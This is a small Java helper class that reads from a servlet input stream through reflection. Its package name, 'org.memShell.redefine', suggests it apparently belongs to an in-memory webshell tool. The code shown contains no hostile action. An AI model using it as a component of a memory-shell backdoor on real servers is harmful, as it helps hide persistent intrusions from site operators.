package org.memShell.redefine;

public class MyServletInputStream {
	public static void read(Object servletInputStream, byte[] a, int b, int c) throws Exception {
		servletInputStream.getClass().getMethod("read", byte[].class, int.class, int.class).invoke(servletInputStream,
				a, b, c);
	}
	
	public static int read(Object servletInputStream, byte[] a) throws Exception {
		return Integer.parseInt(servletInputStream.getClass().getMethod("read", byte[].class).invoke(servletInputStream, a).toString());
	}
}
